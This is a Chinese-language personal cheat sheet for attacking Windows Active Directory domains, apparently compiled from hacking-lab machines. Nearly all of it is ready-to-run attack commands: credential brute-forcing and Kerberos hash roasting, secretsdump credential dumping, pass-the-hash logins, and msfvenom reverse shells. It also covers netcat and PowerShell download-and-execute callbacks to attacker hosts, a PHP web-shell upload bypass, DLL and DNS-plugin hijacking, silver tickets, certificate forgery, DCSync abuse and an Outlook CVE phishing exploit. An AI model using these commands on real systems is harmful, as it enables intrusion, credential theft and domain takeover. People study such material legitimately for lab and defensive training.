---
layout: archive
title: "windows域渗透"
permalink: /cv/
author_profile: true
redirect_from:
  - /resume
---

{% include base_path %}

# 渗透测试一般流程（域控）

# 1. 信息收集

一般就是三台机器DC,ms01（一般入口），ms02；

1. 枚举用户，使用`kerbrute_linux_amd64`枚举用户，或者`ldapsearch`枚举
`./kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt `

2. `nmap -p88,389 ip -Pn --script "ldap*"`,扫描域用户

3. **遇到类似"admin@218"这样的密码但是登陆失败，可以按照年份一个个往后推，如admin@2019......,大概就是密码**

4. nmap扫描域名`nmap -p88 ip -Pn --script "ldap*"`，配合后续ldapsearch使用

# 2. 端口利用

**21端口**
1. 弱口令admin/admin,ftp/ftp等
2. 看到`.htpasswd`文件，要及时下载
3. `wget -m ftp://anonymous:anonymous@10.10.10.98`进行下载
4. `wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98`进行下载

**80端口**
1. 当遇到修改pass的界面时，我们可以抓包进行修改，直接加入到请求头中
![alt text](image-3.png)
更改为
![alt text](image-4.png)

2. Windows的host文件存在`C:\Windows\System32\drivers\etc\hosts`

3. iis目录存在一个`web.config`文件

4. `enum4linux -a -o 域名`枚举，或`enum4linux-ng ip`枚举

5. `curl -X POST http://169.254.177.99:33333/list-current-deployments`直接使用POST访问

6. 无法访问隐藏文件，按`ctrl+F`local

7. 使用kerbrute查看用户`kerbrute -users /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -domain hokkaido-aerospace.com`

8. `wfuzz -u https://streamio.htb -H "Host:FUZZ.streamio.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 315`爆破域名

9. `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -u https://watch.streamio.htb/ -x .php`实现查询

10. `hydra -L users.txt -P passwords.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"`用hydra进行爆破
```
格式："路径:POST数据:失败标识"
"/login.php
目标登录页面的路径
username=^USER^&password=^PASS^
POST 请求的表单数据
^USER^：Hydra 会自动替换为 users.txt 中的用户名
^PASS^：Hydra 会自动替换为 passwords.txt 中的密码
:F=Login failed
失败条件标识：F= 表示查找响应中的文本
如果服务器响应中包含 "Login failed" 这个字符串，就认为这次尝试失败
反之，如果不包含这个字符串，就认为成功
```

11. `7z l -slt Access\ Control.zip  or  7z x Access\ Control.zip`使用7z解压缩

12. `strings -n 8 backup.mdb | sort -u > ../Engineer/wordlist`strings输出的内容通过sort的-u参数去重，然后在输出到文件里面,从backup.mdb文件中输出内容大于等于8的内容

13. Outlook文件使用readpst，mbox文件使用less

**143端口**：
1. 电子邮件枚举，IMAP服务
```bash
nc ip 143
# 连接端口
tag login name@localhost pass
# name和后面的pass都是你要信息收集的信息
# example: tag login jonas@localhost SicMundusCreatusEst
tag LIST "" "*"
# 列出服务器上所有的邮箱（邮件文件夹）
tag SELECT INBOX
# 切换到 INBOX 邮箱,此处是上面列举出的邮箱
tag STATUS INBOX (MESSAGES)
# 查询邮箱状态
tag fetch 1 (BODY[1])
# 获取邮件内容的命令，这里是序列号为1的
tag fetch 2:5 BODY[HEADER] BODY[1]
# 一次性获取多个邮件内容，这里是2-5
# Hepet靶机
```


**389端口**：
1. ldapsearch查看域用户。在上面nmap扫描出域名，使用`ldapsearch -H ldap://ip -x -b "dc=htb,dc=local"`
`ldapsearch -H ldap://streamIO.htb  -x -s base -b '' "(objectClass=*)" "*" + >ldap_result.txt`

2. 利用ldapsearch寻找特定用户`ldapsearch -x -H ldap://ip -D 'name@dc.htb' -w 'password' -b "dc=active,dc=htb"`
`ldapsearch -x -H ldap://10.129.230.181 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb"  #类似的`

3. `cat ldap.txt|grep Pwd`大概有密码

3. ldap输出需要注意的内容
```bash
cat ldap.txt|grep Password
# 查看密码信息
cat ldap.txt|grep @local.htb
# local.htb是你找到的信息，这一步用来筛选用户
cat ldap.txt|grep lock
# 如果lockoutThreshold输出0，说明可以爆破不被锁
```
**139，445端口**: 
1. smb匿名登陆
```bash
smbclient -N -L //ip/ # 查看挂载
smbclient -N //ip/backup # backup是上面可以匿名登陆的挂载
RECURSE ON
PROMPT OFF
mput Backup_2024
# 这会无需任何确认地将本地 Backup_2024 目录整个递归上传到远程服务器当前目录。
mget ProjectFiles
mget *
# 这会把远程服务器上 \ProjectFiles 目录及其所有子目录和文件全部下载到本地当前目录。
```

2. smb账号登陆`smbclient //192.168.1.100/share -U admin%Password123`,其中%分割账号密码

3. 如果中间有空格，使用`smbclient \\\\192.168.204.175\\Password\ Audit -U 'V.Ventz%HotelCalifornia194!'`进行登陆

**3128端口**：Squid 是一个缓存和转发的 HTTP 网络代理。它有多种用途，包括通过缓存重复请求来加速 web 服务器，为共享网络资源的一组人缓存。使用spose.py,`python spose.py --proxy http://192.168.159.189:3128 --target 192.168.159.189`,这里的proxy和target都是靶机目标ip

**5222端口**：XMPP端口，使用pidgin，移步至工具查找使用方法

**5985端口**：可以不用过多查看，evil连接端口，使用`evil-winrm -i ip -u username -p password -S`,这里的username和password都是要自己找，大多数都是impacket系列工具寻找。这个工具好用在上传和下载
```bash
# 要在同一目录下执行
上传： upload 文件名 # example: upload 1.txt
下载： download 文件名 # example: download 1.txt
``` 

# 3. 工具利用

1. **impacket系列工具**
```bash
1.1 impacket-GetNPUsers使用
impacket-GetNPUsers 域名 -dc-ip ip -no-pass
# example：impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
# 可以获得一个哈希值，进行破解
hashcat hash.txt
# 查看hash类型，example 18200
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
# 破解hash值
impacket-GetNPUsers -usersfile user.txt -request -format hashcat -outputfile asp.txt 'jab.htb/'
# user.txt是你找到的user字典集，-format是输出形式为hashcat可以辨认的形式，-outputfile输出到asp.txt，后面的是域名
-------------------------------------------------------
1.2 impacket-GetUserSPNs
impacket-GetUserSPNs dc/name:'pass' -dc-ip ip -request
# example impacket-GetUserSPNs active.htb/SVC:'123456' -dc-ip 10.10.10.100 -request
# 如果报错，说明时间错开太大
ntpdate -u ip
# ip为靶机ip
-------------------------------------------------------
1.3 impacket-secretsdump
impacket-secretsdump username:'password'@ip
# example：impacket-secretsdump abc:'abc123'@10.10.10.161
# 抓取administrator的hash值，后续直接登录
evil-winrm -i ip -u username -H hash
# 直接利用hash登陆
impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM LOCAL
# 脚本来离线提取 NTDS（域数据库）中的用户凭据哈希。
# 需要ntds.dit和SYSTEM文件
-------------------------------------------------------
1.4 impacket-psexec
impacket-psexec dc/username:'password'@ip
# example: impacket-psexec active.htb/john:'abc123.'@10.10.10.161
# 利用账号密码登陆，前提是管理员用户或者管理员用户组，没有dc就不屑dc
or
impacket-psexec dc/name@10.129.193.109
# example: impacket-psexec active.htb/administrator@10.129.193.109
# 后续会有输入密码的阶段，把密码输入
or
impacket-psexec EGOTISTICAL-BANK.LOCAL/administrator@10.129.255.251 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
# 最后的提权会用到，使用impacket-secretsdump获取到的hash值直接写入即可
-------------------------------------------------------
1.5 impacket-mssqlclient
impacket-mssqlclient user:pass@dc
# example: impacket-mssqlclient publicuser:guestuser@sql.htb
responder -I tun0
# 打开smb
在impacket-mssqlclient： EXEC MASTER.sys.xp_dirtree '\\10.10.16.4\test',1,1
# 这是你的smb共享目录，可以获取hash值
# 遇到Log目录一定要去查看日志
# 读文件的操作详细看提权
# 将所有内容全部复制进行破解
-------------------------------------------------------
1.6 impacket-ticketer
# 白银票据攻击，具体去提权那里看
-------------------------------------------------------
1.7 impacket-docmexec
DOCM攻击工具,openfileke最容易有这个漏洞
impacket-docm -object MMC20 -silentcommand -debug dc/name:'pass'@ip 'curl http://lhost'
# dc是靶机的域名，name是用户名，pass是密码，ip是靶机地址，后面的命令可以自己修改
msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port -f exe > shell.exe
# 生成木马
impacket-docm -object MMC20 -silentcommand -debug dc/name:'pass'@ip 'curl http://lhost/shell.exe -o C:\Windows\Temp\shell.exe'
# 上传木马
impacket-docm -object MMC20 -silentcommand -debug dc/name:'pass'@ip 'C:\Windows\Temp\shell.exe'
# 执行木马，这几步都要上传到可写目录，一般是temp和public
------------------------------------------------------
```

2. **nc.exe反弹**
```bash
curl http://ip/port/nc.exe -o \Users\Public\nc.exe # 下载nc
nc.exe ip port -e cmd # 反弹shell
``` 

3. **bloodhood工具**
```bash
cd ~/Desktop/neo4j-community-4.4.46-unix/neo4j-community-4.4.46/bin
export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
export PATH=$JAVA_HOME/bin:$PATH # 换为java 11启动
./neo4j console # 首先开启neo4j
cd ~/Desktop/windowstool/bloodhound/BloodHound-linux-x64
./BloodHound --no-sandbox # 开启bloodhood
# name: neo4j     pass: lin123
# 点击右边upload data，等待信息输入
----------------------------------------------
PS: uploads sharphound.exe
PS: ./sharphound.exe -c All
PS: downloads asd.zip
```

4. **openssl工具**破解.pfx文件
```bash
openssl pkcs12 -in left.pfx -nocerts -out key.pem -nodes
# 从pfx文件中提取私钥
openssl pkcs12 -in lsft.pfx -nokeys -out cert.pem
# 从pfx文件中提取证书
evil-winrm -i ip -c cert.pem -k key.pem -S
# evil直接登陆
```

5. **nxc工具**，密码喷洒
```bash
nxc smb ip -u name -p 'pass' --shares
# name和pass是你找到的账号密码
# 密码可以是空密码，接下来使用ntlm生成test文件
python3 ntlm_theft.py -g lnk -s 192.168.45.189 -f test 
# 位于windows/ntlm_theft
sudo responder -I tun0 # 开启监听
smbclient -L //IP/
cd test
put test.lnk
# 等待几分钟就可以会弹hash
----------------------------------------------------------------------------------
nxc winrm ip -u user.txt -p pass.txt
# user.txt里面有你的用户名爆破字典
nxc winrm ip -u 'admin' -p 'password'
# 不变的账号密码要用引号
----------------------------------------------------------------------------------
nxc smb ip --users
nxc smb ip -u 'dsad' -p '' --rid-brute
# 可能获取用户信息
nxc smb ip  -u user -p pass --continue-on-success
# 查看用户名和密码是否有用
# 获取到的用户信息使用impacket-GetNPUsers枚举
```

6. **gpp-decrpty**
在windows下的`policies`目录下如果找到加密的hash值，使用`gpp-decrypt`工具解密
`gpp-decrypt hash`,其中的hash是你找到的hash值 

7. **钓鱼邮件**
```bash
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homeworking' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.16.24\test.txt" --subject test
# mailing.htb 是域，账号密码为找到的账号密码，sender是发送方，recipient是接收方，url是你的ip地址，subject是你要发的内容
responder -I tun0
# github地址：https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.git
impacket-smbserver share ./
# 如果上面接收不到hash值，用这个接收
```

8. **cadaver**
`cadaver http://ip/`

9. **powershell**
`powershell -ep bypass`可以进入powershell环境

10. github如果无法`git clone`,使用`proxychain4 git clone`

11. **pidgin**

12. **ViewState工具**
容易受到反序列化攻击
```bash
# iis目录存在一个`web.config`文件，先查看web.config文件
https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net
# 使用方法说明
https://github.com/pwntester/ysoserial.net
# 工具下载地址
ysoserial.exe -p ViewState -c "mkdir c:\temp" --path="/portfolio" --apppath="/" --
validationalg="SHA1" -validationkey=5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468 --decryptionalg="AES" --islegacy --isdebug
# 要在Windows上执行，Linux上不行
# validationkey是在web.config上的decryptionkey的值，-c内是你要执行的命令
# 然后会生成一长串代码，复制到VIEWSTATE中
```

13. **LFI工具**
```bash
msfvenom -p php/reverse_php LHOST=192.168.45.195 LPORT=445 -f raw > shell_445.php
# 生成正向shell，记下来在网页上访问http://ip:port/shell_445.php
靶机: cd C:\Users\Public
kali: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.156 LPORT=4443 -f exe > shell.exe # 生成反向shell
靶机: curl http://ip:port/shell.exe -o shell.exe
靶机: shell.exe
# 生成交互式shell
```

14. **SSRF工具**
```bash
# 如果在网页可以访问kali ip，那么符合ssrf
responder -I tun0
# 监听tun0
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# 将获取到的hash使用John破解
```

15. **rpcclient工具**
```bash
rpcclient -W '' -c querydispinfo -U''%'' '192.168.120.181'
# 列举域内的用户名，`reminder`是密码
rpcclient -U '' -N IP
# 空账号密码访问
```

16. **文件上传绕过**
```bash
vim .htaccess
AddType application/x-httpd-php .evil
# 尝试上传
vim shell.php.evil
# <pre><?php echo shell_exec($_REQUEST["cmd"]) ?></pre>
# 接下来就是访问shell.php.evil?cmd=whoami，如果有反应则反弹成功
```bash

17. **ILSpy工具**
```bash
# 一款逆向工具，可以寻找源码中的信息
cd ~/Desktop/windowstool/artifacts/linux-x64
./ILSpy #后将文件导入
```
18. `awk -F'[[:space:]]+' '{print $5}' user.txt>user.list`使用awk提取第五列
19. **John工具**
```bash
john 1.txt # 获取加密方法
# Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])从这一行看出是“krb5asrep”
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt 1.txt
```
# 5. **提权**

```bash
whoami /priv #查看个人权限
whoami /groups #查看组
Get-ADDomain
net user username
cmdkey /list # 查看电脑上存在的凭证
```

1. powershell日志获取，如果使用了powershell，一定会有日志，去powershell目录底下寻找。
`C:\Users\name\Appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine\`,其中name是你的用户

2. 命令劫持提权（exe，dll），exe文件有修改权限，进行修改提权。
dll提权就是我们对于.exe文件没有修改权限，但是对他调用的dll文件有修改权限，这里我们就可以提权
`net user username`属于`Contractors`组，可以进行dll劫持提权
`msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port -f dll > shell.dll`

3. mysql寻找信息`mysql -uroot -proot -e"show databases;"`

4. `whoami /priv`提权信息汇总
`土豆提权`
![alt text](image-2.png)
就比如这里可以使用4.0，3.5，2.0，先用4.0，后3.5，后2.0，用最高的
```bash
# 总体可以去 https://github.com/gtworek/Priv2Admin 看怎么提权，查找的时候去掉Privilege
4.1 SeImpersonatePrivilege 权限
土豆提权 whoami /priv 查看信息，如果存在SeImpersonatePrivilege权限，可以提权，同时使用那个也要查注册表， 
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP" 
最后的那个就是我们想的版本，尽量用高版本,详细看
https://blog.csdn.net/qq_42699326/article/details/144334216?ops_request_misc=elastic_search_misc&request_id=259c7e6dd931c1ea276a731697c504c9&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-144334216-null-null.142^v102^pc_search_result_base5&utm_term=windows%E5%9C%9F%E8%B1%86%E7%B3%BB%E5%88%97%E6%8F%90%E6%9D%83&spm=1018.2226.3001.4187
```
```bash
4.2 SeDebugPrivilege 权限
输入 whoami /priv 出现SeDebugPrivilege权限，就相当于可以调试其他程序，如果有adminstrator的进程可以调试，就可以进行提权
whoami /priv  # 查看权限
ps  # 查看进程
# 几个默认的高权限 比如显示556
https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1
# github下载地址
upload nc.exe # 上传nc.exe
ipmo .\/psgetsys.ps1
ImpersonateFromParentPid -ppid 556 -command "c:\windows\system32\cmd.exe" -cmdargs "/c C:\Users\alaading\Documents\nc.exe ip port -e cmd"
# 后面这个就是反弹shell，nc位置和自己的ip，port设置好
```
```bash
4.3 SeManageVolumePrivilege 权限
whoami /priv 如果显示 SeManageVolumePrivilege ,可以使用 SeManageVolumeExploit.exe 文件提权。上传后使用即可。
```
```bash
4.4 SeRestorePrivilege权限
whoami /priv 如果显示 SeRestorePrivilege ，可以使用EnableSeRestorePrivilege.ps1 文件提权
或者SharpGPOAbuse.exe提权
*Evil-WinRM* PS C:\Users\anirudh\Documents> upload /home/kali/pgplay/SharpGPOAbuse.exe
# 上传文件
*Evil-WinRM* PS C:\Users\anirudh\Documents> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "DEFAULT DOMAIN POLICY"
# 这里的账号是你的账号名字
*Evil-WinRM* PS C:\Users\anirudh\Documents> gpupdate /force
*Evil-WinRM* PS C:\Users\anirudh\Documents> 
impacket-secretsdump vault.offsec/anirudh:SecureHM@192.168.208.172
# 抓取hash
```
```bash
4.5 SeBackupPrivilege 和 SeRestorePrivilege
# 我们可以把sam，system转储出来，破解administrator的hash值，接着利用PTH进行哈希传递攻击，从而获取administrator权限
PS: reg save hklm\sam c:\temp\sam
PS: reg save hklm\system c:\temp\system
PS: downlaod sam
PS: download system
kali: impacket-secretsdump -sam sam -system system local
kali: evil-winrm -i ip -u Adminstrator -H hash # :后半部分
```

5. 服务提权，首先使用`sc qc mysql`，这种的方式查询某个服务的详细配置信息，接下来根据`BINARY_PATH_NAME`查询用于查看和修改文件/文件夹NTFS权限的命令，查询命令
```bash
iscacls E:\mysql\bin\mysql.exe
# 权限级别
# F - 完全控制
# M - 修改
# RX - 读取和执行
# R - 只读
# W - 只写
# 3D - 删除
--------------------------------------------------------------
那么如何提权
1. msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port -f exe > shell.exe
2. upload shell.exe(evil下使用)
3. sc.exe config vss binPath="path"
# road是你shell.exe下载到的路径
4. sc.exe stop vss
5. sc.exe start vss
# 这里需要你有可以停止和启动的权限(server operators)
# vss是默认包含服务，这里的vss就是你有权限停止或开始的项目
-------------------------------------------------------------
# 如果有权利shutdown，那么可以将此exe文件替换成反弹shell文件，最后shutdown -r
rename bd.exe bd.exe.bak
curl http://ip:port/shell.exe -o bd.exe
# 如果上传不了，在可以下载的地方下载，在复制过去
copy C:\xampp\htdocs\reverse.exe bd.exe
shutdown -r -t 0
```


6. 后续可以修改文件，如果有重启权限就重启，大多数情况下没有，但都有开机重启，这个时候我们重新开机即可。

7. 自动枚举服务，使用`powerUP.ps1`文件，然后`Get-modifiableServiceFile`查看可能存在的问题服务。

8. msi提权，使用命令
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 如果这个是0x1，就可以使用msi安装包提权。
msfvenom -p windows/shell_reverse_tcp lhost=ip lport=port -f msi > shell.msi
# 生成msi反弹文件
cd \Users\Public\Downloads
curl http://ip:port/shell.msi -o shell.msi
# 下载文件
msiexec /quiet /i shell.msi
# 反弹shell
```

9. sql-server提权，详细看
```bash
https://blog.csdn.net/m0_64481831/article/details/137070646?ops_request_misc=elastic_search_misc&request_id=5f57b46ab01af65dd47d5a045873063d&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-137070646-null-null.142^v102^pc_search_result_base5&utm_term=sql-server%E6%8F%90%E6%9D%83&spm=1018.2226.3001.4187
```

10. putty信息泄露，使用`reg query "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions"`查看信息，或许有administrator等用户的密码。

11. kdbx文件信息，找到后缀为.kdbx文件，传到Linux中
```bash
python -m SimpleHTTPServer 80 
#开启临时web服务  大概率报错，使用scp
scp gill@192.168.205.142:/home/gill/key* /root 
keepass2john keyfile.kdbx > Keepasshash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt Keepasshash.txt
https://app.keeweb.info/ 
# 破解的文件导入到里面查看密码
```
12. `net group`查看域的组，`local group`查看本地的组

13. 添加用户，DCSync权限
```bash
net group/localgroup
# 查看域/本地的组
net user username password /add /域名
# example: net user abc abc123 /add /domain
# username和password都是你自己设置，域名需要自己分析,密码不能太简单
net group/localgroup "组名" /add abc
# example: net group "Exchange Windows Permissions" abc /add
# 查看是否对某个组有完全操作权限，将用户添加进去
uploads PowerView.ps1
. .\powerview.ps1
$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
# example: $SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force，password是你自己设置的密码
$Cred = New-Object System.Management.Automation.PSCredential('dc\name', $SecPassword)
# example: $Cred = New-Object System.Management.Automation.PSCredential('htb\tester', $SecPassword),dc是域名，name是自己设置的名字
# Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity name -Rights DCSync
# Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity tester -Rights DCSync
# 这里的dc是ad域名，而name是之前设置名字
Add-ObjectACl -PrincipalIdentity tester -Credential $cred -Rights DCSync
```

14. `net user username`查看用户权限

15. 上传文件命令`wget "http://192.168.245.153/HiveNightmare.exe" -outfile "c:\pwn\HiveNightmare.exe"`可以下载到\pwn目录下

16. 端口转发提权
```bash
netstat -anto 
# 查找只有本地访问端口，可以使用 | findstr 参数筛选
# 接下来使用chisel.exe（先下载）
curl http://ip/port/chisel.exe -o chisel.exe
# 先使用curl下载，如果不行使用certutil下载
certutil -split -f -urlcache http://ip/port/chisel.exe
kali: ./chisel server -p port --reverse
# example: ./chisel server -p 9999 --reverse
靶机: start /b chisel.exe client ip:port R:要转发发端口:host:要转发的端口
# example: start /b chisel.exe client 10.10.16.24:9999 R:8888:127.0.0.1:8888
# 二者的端口要一致，同时要搞清楚端口运行什么，接下来就可以访问8888端口了
或者靶机: .\chisel.exe client ip:port R:socks
# example: .\chisel.exe client 10.10.16.12:7080 R:socks
```

17. 使用`net user username`查看`global group`,如果属于*LAPS_Readers组,使用LAPS提权。
```bash
git clone https://github.com/ztrhgf/LAPS.git # 下载LAPS
PS: upload ./LAPS/AdmPwd.PS #上传
PS: Import-Module .\AdmPwd.PS\AdmPwd.PS.psd1 # 上传
PS: Find-AdmPwdExtendedRights -identity *
PS: get-admpwdpassword -computername dc01 | Select password
# dc01是你的域名（未知真假），获得密码
# kali: nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --module laps
# example: nxc ldap "10.129.254.42" -d "timelapse.htb" -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --module laps
kali: evil-winrm -i ip -u administrator -p 'password' -S
# password是你找到的密码
```

18. 对于`Program Files/Program Files（x86）`文件夹因该重点关注

19. 输入`dir /a`报错，可能是环境问题，输入`cmd /c dir /a`可以执行

20. dns攻击（dll劫持提权方法二）
```bash
net user username
# Contractors，可以进行dns攻击
responder -I tun0
# 开启smb服务，或者下面这个也行
impacket-smbserver share ./
# 二选一，不过下面这个似乎更好
msfvenom windows/x64/exec cmd='net administrator password /domain' -f dll > shell.dll
# 使用这个命令可以使得administrator的域用户密码变为password（自己设置）
cmd /c dnscmd localhost /config /serverlevelplugindll \\ip\share\shell.dll
# 攻击和部署DNS插件后门 
sc.exe stop dns
sc.exe start dns
# 没有执行就多执行几次
```

21. 白银票据攻击
```bash
Get-LocalUser -Name $env:USERNAME | Select sid
# 获取sid
impacket-ticketer -nthash pass -domain-sid sid -domain ad -dc-ip dc.ad -spn nonexistent/DC.AD Adminisrator
# 白银票据攻击中的pass是你的password的加密后的hash值，加密地址：https://codebeautify.org/ntlm-hash-generator,sid是你上面获取的sid(去掉最后的数字)，ad是你的域名，后面的是要dc.域名，后面的DC.AD也是如此
# example: impacket-ticketer -nthash 143sdggSF -domain-sid S-1-5-21-4078382237-1492182817-2568127209(去掉了最后的-1106) -domain seq.htb -dc-ip dc.seq.htb -spn nonexistent/DC.SEQ.HTB Adminirtrator
# 最后会生成一个Adminstrator.ccahe文件
export KRB5CCNAME=adminstrator.ccahe
# 添加到环境变量中
impacket-mssqlclient -k dc.ad
# ad是你的ad域名
# example: impacket-mssqlclient -k dc.seq.htb
select SYSTEM_USER
# 因该是administrator权限
SELECT * FROM OPENROWSET(BULK N'C:\Users\Adminstrator\desktop\root.txt',SINGLE_CLOB) AS Contents
# 读取root.txt,也可以用同样的方法读local.txt
```

22. 证书伪造攻击
```bash
github下载地址: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git
PS: upload Certify.exe
# 上传文件
PS: ./Certify.exe find /vulnerable
# 如果在Template Name模块发现UserAuthentication,可以使用
kali: pip install certipy
kali: pip install certipy-ad
kali: certipy req -u name@ad -p pass -upn adminstrator@ad -target ad -dc-ip ip -ca ad-dc-ca -template UserAuthentication
# **注意**：本步骤要在python 3.9.5环境下进行
# example: certipy req -u ray@seq.htb -p asd123 -upn adminstrator@seq.htb -target seq.htb -dc-ip 10.129.239.251 -ca seq-dc-ca -template UserAuthentication
# 会生成administrator.pfx文件
kali: certipy auth -pfx adminstrator.pfx -dc-ip ip
# 提取哈希值
# [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
# 使用后半部分，即a52后面的
kali: evil-winrm -i ip -u Adminstrator -H hash
# hash是你上面获取的hash值
```

23. wsl虚拟机提权 
在信息收集过程中发现很多`Microsoft.`文件
```bash
Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss | %{Get-ItemProperty $ _.PSPath} | out-string -width 4096
# 查看虚拟机信息，获取到BasePath信息
cd \path\rootfs\root
# path是你上面找到的BasePath
cat .bash_history
# 接下来就是Linux的信息
```

24. 修复会话，先使用`echo %PATH%`查看是否包含System32，没有的话使用`set PATH=%PATH%;C:\Windows\System32`修复

25. 在.xml文件中找到加密的密码，使用如下方法解密
```bash
$encryptedPassword = Import-Clixml -Path 'C:\Users\sfitz\Documents\connection.xml'
# -path后是你密码文件的位置
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
$decryptedPassword
```

26. `scp Infrastructure.pdf kali@192.168.45.237:/home/kali/Infrastructure.pdf`回传文件

27. `rename TFTP.EXE TFTP_1.EXE`改名字，将tftp改为tftp_1

28. AD 可以尝试 kerberoasting
```bash
# 在Ghostpack-CompiledBinaries文件夹下的Rubeus.exe
certutil.exe -urlcache -f http://192.168.45.215/Rubeus.exe Rubeus.exe
# 上传rubeus.exe文件，可以使用curl
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# 执行文件
type hashes.kerberoast # 查看文件
sudo hashcat -m 13100 hashes.kerberoast /home/kali/rockyou.txt
# 或者使用john破解
# 使用hashcat破解文件
```

29. 如果evil-winrm， impacket-psexec都无法登陆但是账号密码无误，使用Invoke-RunasCs.ps1，在RunasCs-master目录下Invoke-RunasCs.ps1
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.233 LPORT=80 -f exe>shell.exe
# 先生成反弹shell文件
python -m http.server 85
curl http://192.168.45.233:85/shell.exe -o shell.exe
curl http://192.168.45.233:85/Invoke-RunasCs.ps1 -o Invoke-RunasCs.ps1
# 上传文件和反弹脚本
. .\Invoke-RunasCs.ps1
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "C:\Users\Public\shell.exe"
# 先启动，在反弹，这里账号密码是你找到的，反弹脚本位置自己找好，监听端口，反弹shell
```

30. `whoami /priv`如果显示`SeManageVolumePrivilege`,可以使用SeManageVolumeExploit.exe文件提权。上传后使用即可。

31. 如果可以使用powershell，使用`powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.24:8000/nishang.ps1')"`反弹shell，其中nishang.ps1是在windowstool目录下。最后一行自行修改

